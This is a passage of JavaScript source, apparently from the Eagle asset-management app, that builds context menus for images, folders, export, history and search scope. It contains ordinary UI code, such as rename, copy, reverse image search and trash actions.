                        label: i18n.__('context.image.batchRename.msg1') + items.length + i18n.__('context.image.batchRename.msg2'),
                        keywords: '重命名 rename',
                        icon: 'ic-rename.svg',
                        click: () => {
                            renameImages();
                            $scope.$evalAsync();
                        },
                    },
                    // 重命名(單選)
                    {
                        accelerator: 'CmdOrCtrl+R',
                        visible: !isMultiple,
                        label: i18n.__('context.image.batchRename.msg1'),
                        keywords: '重命名 rename',
                        icon: 'ic-rename.svg',
                        click: () => {
                            renameImages();
                            $scope.$evalAsync();
                        },
                    },
                    // 复制文件
                    {
                        accelerator: 'CmdOrCtrl+C',
                        label: (isMultiple)? i18n.__('context.image.copyItems'): i18n.__('context.image.copyItem'),
                        keywords: 'copy file 複製 文件',
                        icon: 'ic-file-copy.svg',
                        click: () => {
                            $scope.copyImages(event);
                            $scope.$evalAsync();
                        },
                    },
                    // 复制文件路径
                    {
                        accelerator: 'CmdOrCtrl+Alt+C',
                        label: i18n.__('context.image.copyItemPath'),
                        keywords: 'copy path 複製 路徑',
                        icon: 'ic-file-copy-path.svg',
                        click: () => {
                            $scope.copyAsPath();
                            $scope.$evalAsync();
                        },
                    },
                    // 复制...
                    {
                        label: i18n.__("context.image.copy"),
                        keywords: 'copy 複製',
                        icon: 'ic-file-copy-ohters.svg',
                        submenu: {
                            items: [
                                // 复制链接
                                {
                                    label: i18n.__("appmenu.edit>copyAsLink"),
                                    keywords: `${i18n.__("context.image.copy")} copy link 拷貝 複製 鏈接 連結`,
                                    icon: '',
                                    click: () => {
                                        $scope.copyAsLink(undefined, items);
                                        $scope.$evalAsync();
                                    },
                                },
                                // 文件夹路径
                                {
                                    accelerator: 'CmdOrCtrl+Alt+Shift+C',
                                    label: i18n.__("context.image.copyAsFolderPath"),
                                    keywords: `${i18n.__("context.image.copy")} copy folder path 拷貝 複製 文件夾 資料夾 路徑`,
                                    icon: '',
                                    click: () => {
                                        $scope.copyAsFolderPath();
                                        $scope.$evalAsync();
                                    },
                                },
                                // 缩略图
                                {
                                    label: i18n.__("context.image.copyAsThumbnail"),
                                    keywords: `${i18n.__("context.image.copy")} copy thumbnail 拷貝 複製 縮略圖`,
                                    icon: '',
                                    click: () => {
                                        $scope.copyAsThumbnail();
                                        $scope.$evalAsync();
                                    },
                                },
                                // Base64
                                {
                                    disabled: isMultiple,
                                    label: 'Base64',
                                    keywords: `${i18n.__("context.image.copy")} copy 拷貝 複製`,
                                    icon: '',
                                    click: () => {
                                        $scope.copyAsBase64();
                                        $scope.$evalAsync();
                                    },
                                },
                                // 名称
                                {
                                    label: i18n.__("context.image.copyAsName"),
                                    keywords: `${i18n.__("context.image.copy")} copy name 拷貝 複製 名稱`,
                                    icon: '',
                                    click: () => {
                                        $scope.copyAsProperity("name");
                                        $scope.$evalAsync();
                                    },
                                },
                            ]
                        }
                    },
                    // 复制标签
                    {
                        disabled: !(eagle?.inspector?.newTags?.length > 0),
                        accelerator: 'CmdOrCtrl+Shift+C',
                        label: i18n.__('context.image.copyTag'),
                        keywords: 'copy tag 複製 標籤',
                        icon: 'ic-tag-copy.svg',
                        click: () => {
                            $scope.copyTags();
                        },
                    },
                    // 粘贴标签
                    {
                        disabled: !eagle.inspector.copiedTags,
                        accelerator: 'CmdOrCtrl+Shift+V',
                        label: i18n.__('context.image.pasteTag'),
                        keywords: 'paste tag 粘貼 標籤 貼上',
                        icon: 'ic-tag-paste.svg',
                        click: () => {
                            $scope.pasteTags();
                        },
                    },
                    // ---
                    {
                        role: 'separator',
                    },
                    // 創建拼圖（多選）
                    {
                        visible: isMultiple && isSupportFormat,
                        accelerator: "CmdOrCtrl+Shift+M",
                        label: i18n.__('context.image.merge'),
                        keywords: 'merge combine 拼圖 合併',
                        icon: 'ic-file-combine.svg',
                        click: () => {
                            $scope.openMergeImageContextMenu();
                            $scope.$evalAsync();
                        }
                    },
                    // 创建副本(單選)
                    {
                        visible: !isMultiple,
                        accelerator: 'CmdOrCtrl+D',
                        label: i18n.__("context.image.clone"),
                        keywords: 'clone duplicate 複製 副本',
                        icon: 'ic-copy-duplicate.svg',
                        click: () => {
                            $scope.duplicateItem();
                            $scope.$evalAsync();
                        },
                    },
                    // ---
                    {
                        role: 'separator',
                    },
                    // 进入简报模式
                    {
                        visible: !isFullScreen,
                        accelerator: 'F5',
                        label: i18n.__('context.image.slideshowOn'),
                        keywords: 'enter slide show presentation 簡報 演示 進入',
                        icon: 'ic-slideshow-on.svg',
                        click: () => {
                            $scope.toggleSlideshow();
                        }
                    },
                    // 離開全螢幕
                    {
                        visible: isFullScreen,
                        label: i18n.__('context.image.slideshowOff'),
                        accelerator: $rootScope.preferences.shortcuts.keybinds['slideshow'] || 'F5',
                        keywords: 'exit leave slide show presentation 簡報 演示 離開 退出',
                        icon: 'ic-slideshow-off.svg',
                        click: () => {
                            ipcRenderer.send('toggle-slideshow');
                        }
                    },
                    // 顯示導航器（詳情模式）
                    {
                        visible: isDetailMode,
                        checked: !$scope.isHideNavigator,
                        label: i18n.__("appmenu.view>showNavigator"),
                        keywords: 'show navigator 導航器 顯示',
                        icon: 'ic-navigator.svg',
                        click: () => {
                            $scope.isHideNavigator = !$scope.isHideNavigator;
                            localStorage["isHideNavigator"] = $scope.isHideNavigator;
                            $scope.$evalAsync();
                        },
                    },
                    // 缩略图背景
                    {
                        visible: !isDetailMode,
                        label: i18n.__('context.image.thumbnailBG'),
                        keywords: 'thumbnail background 縮略圖 背景',
                        icon: 'ic-file-transparent-grid.svg',
                        submenu: {
                            items: [
                                // 無
                                {
                                    checked: !item.background,
                                    icon: 'ic-transparent-grid-none.svg',
                                    label: i18n.__('context.image.thumbnailBG>none'),
                                    keywords: `${i18n.__('context.image.thumbnailBG')} thumbnail background transparent grid none 縮略圖 背景 無`,
                                    click: () => { $scope.changeImagesBackground(items, undefined); }
                                },
                                // ---
                                {
                                    role: 'separator',
                                },
                                // 黑
                                {
                                    checked: item.background === 'dark',
                                    icon: 'ic-transparent-grid-black.svg',
                                    label: i18n.__('context.image.thumbnailBG>dark'),
                                    keywords: `${i18n.__('context.image.thumbnailBG')} thumbnail background transparent grid dark black 縮略圖 背景 黑 #000`,
                                    click: () => { $scope.changeImagesBackground(items, 'dark'); }
                                },
                                // 灰
                                {
                                    checked: item.background === 'gray',
                                    icon: 'ic-transparent-grid-gray.svg',
                                    label: i18n.__('context.image.thumbnailBG>gray'),
                                    keywords: `${i18n.__('context.image.thumbnailBG')} thumbnail background transparent grid gray grey 縮略圖 背景 灰 #777`,
                                    click: () => { $scope.changeImagesBackground(items, 'gray'); }
                                },
                                // 白
                                {
                                    checked: item.background === 'light',
                                    icon: 'ic-transparent-grid-white.svg',
                                    label: i18n.__('context.image.thumbnailBG>light'),
                                    keywords: `${i18n.__('context.image.thumbnailBG')} thumbnail background transparent grid light white 縮略圖 背景 白 #fff`,
                                    click: () => { $scope.changeImagesBackground(items, 'light'); }
                                },
                                // 網格
                                {
                                    checked: item.background === 'grid',
                                    icon: 'ic-transparent-grid.svg',
                                    label: i18n.__('context.image.thumbnailBG>grid'),
                                    keywords: `${i18n.__('context.image.thumbnailBG')} thumbnail background transparent grid 縮略圖 背景 網格 透明`,
                                    click: () => { $scope.changeImagesBackground(items, 'grid'); }
                                },
                            ]
                        }
                    },
                    // 黑白预览
                    {
                        checked: $scope.isGrayscaleMode,
                        accelerator: 'CmdOrCtrl+Alt+G',
                        label: i18n.__('appmenu.view>grayscale'),
                        keywords: 'grayscale black 黑白 预览 預覽',
                        icon: 'ic-grayscale.svg',
                        keepOpen: true,
                        click: () => {
                            $scope.isGrayscaleMode = !$scope.isGrayscaleMode;
                            if (process.platform == 'darwin') {
                                applicationMenu.items[6].submenu.items[15].checked = $scope.isGrayscaleMode;
                            }
                            else {
                                applicationMenu.items[5].submenu.items[15].checked = $scope.isGrayscaleMode;
                            }
                            $scope.$evalAsync();
                        }
                    },
                    // 以图搜图
                    {
                        visible: item.ext !== 'svg',
                        label: i18n.__('context.image.reverseSearch'),
                        keywords: 'reverse search picture image',
                        icon: 'ic-reverse-search.svg',
                        submenu: {
                            items: [
                                // Google
                                {
                                    visible: EagleConfig.SUPPORT_FORMATS[item.ext] && item.ext !== 'svg',
                                    label: i18n.__('context.image.reverseSearch>google'),
                                    keywords: `${i18n.__('context.image.reverseSearch')} google reverse search image 以圖找圖`,
                                    enabled: item.ext !== 'svg',
                                    accelerator: "Shift+G",
                                    click: () => {
                                        eagle.reverseImageSearch.search(item, ReverseImageSearch.ENGINES.GOOGLE);
                                        $scope.$evalAsync();
                                    }
                                },
                                // Bing
                                {
                                    visible: item.ext !== 'svg',
                                    label: i18n.__("general.bing"),
                                    keywords: `${i18n.__('context.image.reverseSearch')} bing reverse search image 以圖找圖`,
                                    enabled: item.ext !== 'svg',
                                    click: () => {
                                        eagle.reverseImageSearch.search(item, ReverseImageSearch.ENGINES.BING);
                                    }
                                },
                                // Yandex
                                {
                                    visible: item.ext !== 'svg',
                                    label: "Yandex",
                                    keywords: `${i18n.__('context.image.reverseSearch')} reverse search image 以圖找圖`,
                                    enabled: item.ext !== 'svg',
                                    click: () => {
                                        eagle.reverseImageSearch.search(item, ReverseImageSearch.ENGINES.YANDEX);
                                    }
                                },
                                // TinEye
                                {
                                    visible: item.ext !== 'svg',
                                    label: "TinEye",
                                    keywords: `${i18n.__('context.image.reverseSearch')} reverse search image 以圖找圖`,
                                    enabled: item.ext !== 'svg',
                                    click: () => {
                                        eagle.reverseImageSearch.search(item, ReverseImageSearch.ENGINES.TINEYE);
                                    }
                                },
                                {
                                    visible: item.ext !== 'svg',
                                    label: "SauceNAO",
                                    keywords: `${i18n.__('context.image.reverseSearch')} reverse search image 以圖找圖 sauceNAO`,
                                    enabled: item.ext !== 'svg',
                                    click: () => {
                                        eagle.reverseImageSearch.search(item, ReverseImageSearch.ENGINES.SAUCENAO);
                                    }
                                },
                                // ---
                                {
                                    visible: item.ext !== 'svg' && preferences.general.language === 'zh_CN',
                                    label: "百度",
                                    keywords: `${i18n.__('context.image.reverseSearch')} baidu reverse search image 以圖找圖`,
                                    enabled: item.ext !== 'svg',
                                    accelerator: "Shift+B",
                                    click: () => {
                                        eagle.reverseImageSearch.search(item, ReverseImageSearch.ENGINES.BAIDU);
                                    }
                                },
                                {
                                    visible: item.ext !== 'svg' && preferences.general.language === 'zh_CN',
                                    label: "搜狗",
                                    keywords: `${i18n.__('context.image.reverseSearch')} sougo reverse search image 以圖找圖`,
                                    enabled: item.ext !== 'svg',
                                    click: () => {
                                        eagle.reverseImageSearch.search(item, ReverseImageSearch.ENGINES.SOGOU);
                                    }
                                }
                            ]
                        }
                    },
                    // ---(Webp)
                    {
                        visible: item.ext === 'webp',
                        role: 'separator',
                    },
                    // 转换为
                    {
                        visible: item.ext === 'webp',
                        label: i18n.__("context.image.webpConvert"),
                        icon: 'ic-webp-convert.svg',
                        submenu: {
                            items: [
                                // PNG
                                {
                                    visible: item.ext === 'webp',
                                    label: "PNG",
                                    keywords: `${i18n.__("context.image.webpConvert")} webp convert png 轉換`,
                                    click: () => { $rootScope.$broadcast('WEBP_CONVERT_START', { images: $scope.selected, format: "png" }); $scope.$evalAsync(); }
                                },
                                // JPG
                                {
                                    visible: item.ext === 'webp',
                                    label: "JPG",
                                    keywords: `${i18n.__("context.image.webpConvert")} webp convert jpg 轉換`,
                                    click: () => { $rootScope.$broadcast('WEBP_CONVERT_START', { images: $scope.selected, format: "jpg" }); $scope.$evalAsync(); }
                                },
                            ]
                        }
                    },
                    // 更多
                    {
                        label: i18n.__('Context.Image.Other'),
                        keywords: '',
                        icon: 'ic-more-actions.svg',
                        submenu: {
                            items: [
                                // 自定义缩略图（选择文件）
                                {
                                    visible: !isMultiple && !NOT_SUPPORT_CUSTEOM_THUMBNAIL_TYPES[item.ext],
                                    accelerator: 'CmdOrCtrl+Alt+T',
                                    label: i18n.__("context.image.customThumb"),
                                    keywords: 'more thumbnail custom 更多 自定義 縮略圖 縮圖',
                                    icon: '',
                                    click: () => {
                                        $scope.setCustomThumbnail();
                                    },
                                },
                                // 自定义缩略图（从剪切板）
                                {
                                    visible: !isMultiple && !NOT_SUPPORT_CUSTEOM_THUMBNAIL_TYPES[item.ext],
                                    accelerator: 'CmdOrCtrl+Shift+Alt+T',
                                    label: i18n.__("context.image.customThumbFromClipboard"),
                                    keywords: 'more thumbnail custom clipboard 更多 自定義 縮略圖 縮圖 剪貼簿 剪切板',
                                    icon: '',
                                    click: () => {
                                        $scope.setCustomThumbnailFromClipboard();
                                    },
                                },
                                // 重置缩略图
                                {
                                    visible: !isMultiple && !!item.customThumbnail && !NOT_SUPPORT_CUSTEOM_THUMBNAIL_TYPES[item.ext],
                                    label: i18n.__("context.image.customThumb>reset"),
                                    keywords: 'more thumbnail custom reset 更多 自定義 縮略圖 縮圖 重置',
                                    icon: '',
                                    click: () => {
                                        delete $scope.selected[0].customThumbnail;
                                        $scope.regenerateThumbnailQueue.push($scope.selected[0]);
                                        $scope.$evalAsync();
                                        ayncsImagesGenerateThumbnail([$scope.selected[0]]);
                                    }
                                },
                                // ---
                                {
                                    visible: !isMultiple && !NOT_SUPPORT_CUSTEOM_THUMBNAIL_TYPES[item.ext],
                                    role: 'separator',
                                },
                                // 刷新缩略图
                                {
                                    accelerator: 'CmdOrCtrl+Alt+R',
                                    label: i18n.__('context.image.updateThumbanil'),
                                    keywords: 'more thumbnail update refresh 更多 縮略圖 縮圖 刷新 更新',
                                    icon: '',
                                    click: () => {
                                        $scope.regenerateThumbnail();
					                    $scope.$evalAsync();
                                    },
                                },
                                // 重新分析颜色
                                {
                                    label: i18n.__('context.image.updatePalette'),
                                    keywords: 'more palette color update refresh 更多 調色板 調色盤 刷新 更新 重新分析 顏色',
                                    icon: '',
                                    click: () => {
                                        ayncsImagesGeneratePalette(items);
                                    },
                                },
                                // ---（字體）
                                {
                                    visible: !!FONT_TYPES[item.ext],
                                    role: 'separator',
                                },
                                // 以 family name 重命名字体（字體）
                                {
                                    visible: !!FONT_TYPES[item.ext],
                                    label: i18n.__('Context.Image.Font.Rename'),
                                    keywords: 'font rename 字體 字型 重命名',
                                    click: () => {
                                        $scope.renameFontsWithFullName(items);
                                    }
                                },
                                // 設置字體預設語言（字體）
                                {
                                    visible: !!FONT_TYPES[item.ext],
                                    role: 'label',
                                    label: i18n.__("Context.Image.Font.ChangeLang"),
                                },
                                {
                                    visible: !!FONT_TYPES[item.ext],
                                    label: "English",
                                    keywords: 'font english en us 字體 字型 英文',
                                    click: () => {
                                        $scope.changeFontDefaultLang(items, 'en');
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    visible: !!FONT_TYPES[item.ext],
                                    label: "日本語",
                                    keywords: 'font japanese jp 字體 字型 日文',
                                    click: () => {
                                        $scope.changeFontDefaultLang(items, 'jp');
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    visible: !!FONT_TYPES[item.ext],
                                    label: "한국어",
                                    keywords: 'font korean kr 字體 字型 韓文',
                                    click: () => {
                                        $scope.changeFontDefaultLang(items, 'kr');
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    visible: !!FONT_TYPES[item.ext],
                                    label: "Chinese(Simplified)",
                                    keywords: 'font chinese simplified zh_CN 字體 字型 簡體中文',
                                    click: () => {
                                        $scope.changeFontDefaultLang(items, 'zh_CN');
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    visible: !!FONT_TYPES[item.ext],
                                    label: "Chinese(Traditional)",
                                    keywords: 'font chinese traditional zh_TW 字體 字型 繁體中文',
                                    click: () => {
                                        $scope.changeFontDefaultLang(items, 'zh_TW');
                                        $scope.$evalAsync();
                                    }
                                },
                            ]
                        }
                    },
                    // ---
                    {
                        role: 'separator',
                    },
                    // 從文件夾中移除
                    {
                        visible: !!$scope.currentFolder,
                        accelerator: (process.platform === 'darwin')? 'CmdOrCtrl+Shift+Backspace': 'Shift+Delete',
                        label: i18n.__('context.image.removeFromFolder'),
                        keywords: 'remove from folder delete 從文件夾中移除 從資料夾中移除',
                        icon: 'ic-file-remove-folder.svg',
                        click: () => {
                            $scope.removeFromFolder(event, $scope.currentFolder.id);
                            $scope.$evalAsync();
                        },
                    },
                    // 丢到回收站
                    {
                        visible: viewMode !== 'trash',
                        accelerator: (process.platform === 'darwin')? 'CmdOrCtrl+Backspace': 'Delete',
                        label: i18n.__('context.image.moveToTrash'),
                        keywords: 'move to trash remove delete 丟到回收站 垃圾桶',
                        icon: 'ic-file-move-trash.svg',
                        click: () => {
                            $scope.removeSelected();
                            $scope.$evalAsync();
                        },
                    },
                    // 永久刪除
                    {
                        visible: viewMode === 'trash',
                        label: i18n.__('dialog.permanentlyDelay.title'),
                        keywords: 'permanently delete remove 永久刪除',
                        icon: 'ic-file-delete-permanently.svg',
                        click: () => {
                            swal({
                                html: `
                                    <div class="alert">
                                        <div class="alert-icon warning"></div>
                                        <h4 class="alert-title">${i18n.__('dialog.permanentlyDelay.title')}</h4>
                                        <p class="alert-desc">${i18n.__("dialog.permanentlyDelay.desc")}</p>
                                    </div>
                                `,
                                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                                width: 400,
                                customClass: "alert-box",
                                cancelButtonColor: "#777777",
                                confirmButtonText: i18n.__('dialog.permanentlyDelay.button'),
                                cancelButtonText: i18n.__("general.cancel"),
                            }).then(() => {
                                $scope.$evalAsync(() => {
                                    $scope.removePermanently();
                                    if ($rootScope.preferences.notification.soundEffect.enable != 'false' && $rootScope.preferences.notification.soundEffect.when.deleteFolder == 'true') {
                                        $scope.removeSound.play();
                                    }
                                });
                            });
                        },
                    },
                ],
                showSearch: true,
            });
            $rootScope.currentFocus = "content";
        };

        // 快速跳跃历史记录选单
        $scope.openHistoryContenxtMenu = function(event) {
            event && event.stopPropagation();
            if ($scope.navigationHistory.length > 0) {
                const menuItems = $scope.navigationHistory.slice().reverse().filter((history) => {
                    if (history?.type === 'folder') {
                        return !!$scope.folderMappings[history?.value?.id];
                    }
                    return history?.type === 'smartFolder' || history?.type === 'tag';
                }).map((history) => {
                    return {
                        label: history.value.name,
                        click: () => {
                            $scope.gotoHistory($scope.navigationHistory.indexOf(history));
                        }
                    }
                }).slice(0, 10);

                ContextMenu.open({
                    items: menuItems,
                    showSearch: false,
                });
            }
        };

        $scope.openQuickAccessContextMenu = function (event, item) {
            const $target = $(event.delegateTarget);
            ContextMenu.open({
                items: [
                    {
                        label: i18n.__("Context.QuickAccess.Remove"),
                        icon: "ic-favorite-remove.svg",
                        click: () => {
                            const idx = $scope.quickAccess.indexOf(item);
                            if (idx !== -1) {
                                QuickAccessManager.removeIndex(idx);
                                $scope.$evalAsync();
                            }
                        }
                    }
                ],
                showSearch: false,
                onOpened: () => {
                    $target.addClass("context-activate");
                },
                onClosed: () => {
                    $target.removeClass("context-activate");
                }
            });
        };

        $scope.openImageExportContextMenu = function (event) {
        	event && event.stopPropagation();
        	if ($scope.selected.length === 0) return;
            const SUPPORT_FORMATS = { "jpg": true, "jfif": true, "jpe": true, "jpeg": true, "insp": true, "png": true, "gif": true, "webp": true, "bmp": true, "svg": true };
            let items = $scope.selected.filter(function (image) {
                var ext = image.ext && image.ext.toLowerCase();
                return SUPPORT_FORMATS[ext];
            });
            ContextMenu.open({
                items: [
                    {
                        label: i18n.__("context.image.export>eaglepack"),
                        keywords: 'export eaglepack 導出 エクスポート',
                        icon: 'ic-export-eaglepack.svg',
                        accelerator: 'CmdOrCtrl+Shift+E',
                        click: () => {
                            $scope.exportSelectedAsEaglepack();
                        }
                    },
                    {
                    
                        label: i18n.__("context.image.export>computer"),
                        keywords: 'export computer local 導出 エクスポート 本地',
                        icon: 'ic-export-computer.svg',
                        accelerator: 'CmdOrCtrl+E',
                        click: () => {
                            $scope.exportSelectedAsFolder();
                        }
                    },
                    {
                        visible: items.length > 0,
                        label: i18n.__("context.image.exportAsFormat"),
                        keywords: 'export format 導出 エクスポート',
                        icon: 'ic-export-format.svg',
                        accelerator: 'Shift+E',
                        click: () => {
                            $scope.$evalAsync(() => {
                                $scope.exportSelectedAsFormat();
                            });
                        }
                    }
                ],
                showSearch: false,
            });
        }

        $scope.openFolderExportContextMenu = (event, folder) => {
            if (!folder) return;
            event && event.stopPropagation();

            ContextMenu.open({
                items: [
                    {
                        label: i18n.__("context.exportFolder.export>eaglepack"),
                        keywords: 'export eaglepack 導出 エクスポート',
                        icon: 'ic-export-eaglepack.svg',
                        click: () => {
                            $scope.exportFolderAsEaglepack(folder);
                        }
                    },
                    {
                        label: i18n.__("context.exportFolder.export>computer"),
                        keywords: 'export computer local 導出 エクスポート 本地',
                        icon: 'ic-export-computer.svg',
                        click: () => {
                            $scope.exportFolderAsFolder(folder);
                        }
                    }
                ],
                showSearch: false,
            });
        };

        $scope.openSmartFolderExportContextMenu = (event, smartFolder) => {
            if (!smartFolder) return;
            event && event.stopPropagation();

            ContextMenu.open({
                items: [
                    {
                        label: i18n.__("context.smartFolder.export>computer"),
                        keywords: '導出 エクスポート 本地 export computer local',
                        icon: 'ic-export-computer.svg',
                        click: () => {
                            $scope.smartFolderExportAsFolder(event, smartFolder);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        label: i18n.__("context.smartFolder.export>eaglepack"),
                        keywords: '導出 エクスポート export eaglepack',
                        icon: 'ic-export-eaglepack.svg',
                        click: () => {
                            $scope.smartFolderExportAsPack(event, smartFolder);
                            $scope.$evalAsync();
                        }
                    }
                ],
                showSearch: false,
            });
        };

        $scope.openSubFolderContextMenu = function(event, folder) {

            event && event.stopPropagation();

            const target = event.target;
            const enabled = !(folder?.password && !folder?.isUnLock);

            $scope.selectFolder(event, folder); 

            ContextMenu.open({
                items: [
                    {
                        label: i18n.__('context.subFolder.rename'),
                        icon: 'ic-rename.svg',
                        disabled: !enabled,
                        click: () => {
                            var $subFolder = $(".sub-folder").has(target);
                            event.target = $subFolder.find(".name")[0];
                            $scope.enableSubFolderNameEditable(event, folder);
                        }
                    },
                    {
                        label: i18n.__('context.subFolder.autoTagging'),
                        icon: 'ic-folder-auto-tag.svg',
                        disabled: !enabled,
                        click: (event) => {
                            $scope.$evalAsync(() => {
                                $scope.settingFolder(event, folder);
                            });
                        }
                    },
                    // 文件夹密码设定
                    {
                        label: i18n.__('context.subFolder.password'),
                        icon: 'ic-password.svg',
                        submenu: {
                            items: [
                                {
                                    disabled: !!folder.password,
                                    label: i18n.__("context.subFolder.password>create"),
                                    click: () => {
                                        $scope.setFolderPassword(folder);
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    disabled: !folder.password,
                                    label: i18n.__("context.subFolder.password>change"),
                                    click: () => {
                                        $scope.changeFolderPassword(folder);
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    disabled: !folder.password,
                                    label: i18n.__("context.subFolder.password>reset"),
                                    click: () => {
                                        $scope.resetFolderPassword(folder);
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    disabled: !(!!folder.password && !!folder.isUnLock),
                                    label: i18n.__("context.subFolder.password>lock"),
                                    click: () => {
                                        delete folder.isUnLock;
                                        $scope.isLoading = true;
                                        $scope.updateSidebarList();
                                        $scope.calculateImageBinding({ ignoreSort: true }, () => {
                                            $scope.rebindRefresh();
                                            $scope.updateSelection();
                                            $scope.isLoading = false;
                                        });
                                        $scope.$evalAsync();
                                    }
                                }
                            ]
                        }
                    },
                    {
                        visible: enabled,
                        role: 'separator',
                    },
                    {
                        visible: enabled,
                        icon: 'ic-export.svg',
                        label: i18n.__("context.subFolder.export"),
                        submenu: {
                            items: [
                                {
                                    label: i18n.__("context.subFolder.export>eaglepack"),
                                    icon: 'ic-export-eaglepack.svg',
                                    click: () => {
                                        $scope.exportFolderAsEaglepack(folder);
                                    }
                                },
                                {
                                    label: i18n.__("context.subFolder.export>computer"),
                                    icon: 'ic-export-computer.svg',
                                    click: () => {
                                        $scope.exportFolderAsFolder(folder);
                                    }
                                }
                            ]
                        }
                    },
                    {
                        role: 'separator',
                    },
                    {
                        disabled: !enabled,
                        accelerator: (process.platform == 'darwin')? 'CmdOrCtrl+Backspace': '',
                        label: i18n.__('context.subFolder.remove'),
                        icon: 'ic-folder-remove.svg',
                        click: () => {
                            $scope.removeFolder(folder, {
                                ignoreSelectNext: true
                            });
                            $scope.$evalAsync();
                        }
                    }
                ],
                showSearch: false,
                onOpened: () => {
                    folder.isSelected = true;
                },
                onClosed: () => {
                    folder.isSelected = false;
                }
            });            
        };

        $("body").on("click", ".group-item-name .name", function() {
            $(".folder-rename-input").blur();
        });

        $scope.quickOpenFolder = function(folder, t) {
            var target = t || $scope.selected[0];
            if (folder) {
            	$scope.openFolder(folder, undefined, undefined, true);
            }
            else {
            	$scope.openAll();
            }
            setTimeout(function () { 
                $scope.changeSidebarIndex(folder); 
                $scope.$evalAsync();
            }, 200);
            // 自动定位
            if (target) {
                setTimeout(function () {
                    for (var i = $scope.allData.length - 1; i >= 0; i--) {
                        var image = $scope.allData[i];
                        if (target === image) {
                            var startPage = parseInt(i / 60);
                            console.log(`目标在第 ${startPage} 页`);
                            $scope.startCursor = startPage;
                            $("#box-container").css("visibility", "hidden");
                            $scope.reload();
                            $scope.selected = [];
                            $timeout(function () {
                                $scope.select(undefined, target);
                                autoScroll();
                                setTimeout(function () {
                                    $("#box-container").css("visibility", "initial");
                                }, 100);
                            }, 500);
                            $scope.$evalAsync();
                        }
                    }
                }, 200);
            }
        };

        $scope.scrollToSelectedItem = function() {
            var target = $scope.selected[0];
            // 自动定位
            if (target) {

                if (target.id) {
                    var $box =$(`#box-${target.id}`);
                    if ($box.length > 0 && isElementVisible($box[0]) ) {
                        console.log("无须滚动");
                        return;
                    }
                }
                // var originSelected = [];
                // originSelected = originSelected.concat($scope.selected);
                if ($scope.currentFolder && $scope.currentFolder.orderBy === "RANDOM") {
                    return;        
                }

                for (var i = $scope.allData.length - 1; i >= 0; i--) {
                    var image = $scope.allData[i];
                    if (target && target === image) {
                        var startPage = parseInt(i / 60);
                        console.log(`目标在第 ${startPage} 页`);
                        if (startPage !== $scope.startCursor) {
                            // NOTE: 篩許器狀態下強制切換到某一頁面
                            $scope.rebindRefresh(undefined, undefined, startPage);
                            $scope.relayout();    
                        }
                        $("#box-container").css("visibility", "hidden");
                        $scope.startCursor = startPage;
                        $rootScope.currentFocus = "content";
                        $timeout(function () {
                            // $scope.selected = originSelected;
                            $scope.selected.forEach(function (item) {
                                $scope.select(undefined, item);
                            })
                            autoScroll();
                            setTimeout(function () {
                                $("#box-container").css("visibility", "initial");
                            }, 50);
                        }, 200);
                        $scope.$evalAsync();
                        break;
                    }
                }
            }
        };

        $scope.openSearchScopeMenu = function (event) {
            event && event.stopPropagation();

            const updateUI = () => {
                if ($scope.keyword) {
                    $scope.filterContent();
                }
                $scope.$evalAsync();
            };

            ContextMenu.open({
                items: [
                    {
                        role: 'label',
                        label: i18n.__("Context.SearchScope.Label") + ":",
                    },
                    {
                        label: i18n.__("general.imageName"),
                        icon: 'ic-search-scope-name.svg',
                        checked: $scope.isSearchScopeName,
                        keepOpen: true,
                        click: () => {
                            $scope.isSearchScopeName = !$scope.isSearchScopeName;
                            localStorage.setItem("eagle.search.scope.name", $scope.isSearchScopeName);
                            updateUI();
                        }
                    },
                    {
                        label: i18n.__("general.folderName"),
                        icon: 'ic-search-scope-folder.svg',
                        checked: $scope.isSearchScopeFolderName,
                        keepOpen: true,
                        click: () => {
                            $scope.isSearchScopeFolderName = !$scope.isSearchScopeFolderName;
                            localStorage.setItem("eagle.search.scope.folderName", $scope.isSearchScopeFolderName);
                            updateUI();
                        }
                    },
                    {
                        label: i18n.__("general.folderDesc"),
                        icon: 'ic-search-scope-folder-desc.svg',
                        checked: $scope.isSearchScopeFolderDesc,
                        keepOpen: true,
                        click: () => {
                            $scope.isSearchScopeFolderDesc = !$scope.isSearchScopeFolderDesc;
                            localStorage.setItem("eagle.search.scope.folderDesc", $scope.isSearchScopeFolderDesc);
                            updateUI();
                        }
                    },
                    {
                        label: i18n.__("general.imageExt"),
                        icon: 'ic-search-scope-ext.svg',
                        checked: $scope.isSearchScopeExt,
                        keepOpen: true,
                        click: () => {
                            $scope.isSearchScopeExt = !$scope.isSearchScopeExt;
                            localStorage.setItem("eagle.search.scope.ext", $scope.isSearchScopeExt);
                            updateUI();
                        }
                    },
                    {
                        label: i18n.__("general.imageTags"),
                        icon: 'ic-search-scope-tag.svg',
                        checked: $scope.isSearchScopeTag,
                        keepOpen: true,
                        click: () => {
                            $scope.isSearchScopeTag = !$scope.isSearchScopeTag;
                            localStorage.setItem("eagle.search.scope.tag", $scope.isSearchScopeTag);
                            updateUI();
                        }
                    },
                    {
                        label: i18n.__("general.imageUrl"),
                        icon: 'ic-search-scope-link.svg',
                        checked: $scope.isSearchScopeUrl,
                        keepOpen: true,
                        click: () => {
                            $scope.isSearchScopeUrl = !$scope.isSearchScopeUrl;
                            localStorage.setItem("eagle.search.scope.url", $scope.isSearchScopeUrl);
                            updateUI();
                        }
                    },
                    {
                        label: i18n.__("general.imageAnnotation"),
                        icon: 'ic-search-scope-comment.svg',
                        checked: $scope.isSearchScopeAnnotation,
                        keepOpen: true,
                        click: () => {
                            $scope.isSearchScopeAnnotation = !$scope.isSearchScopeAnnotation;
                            localStorage.setItem("eagle.search.scope.annotation", $scope.isSearchScopeAnnotation);
                            updateUI();
                        }
                    },
                    {
                        label: i18n.__("general.imageNote"),
                        icon: 'ic-search-scope-note.svg',
                        checked: $scope.isSearchScopeNote,
                        keepOpen: true,
                        click: () => {
                            $scope.isSearchScopeNote = !$scope.isSearchScopeNote;
                            localStorage.setItem("eagle.search.scope.note", $scope.isSearchScopeNote);
                            updateUI();
                        }
                    }
                ],
                showSearch: false,
            });
        };

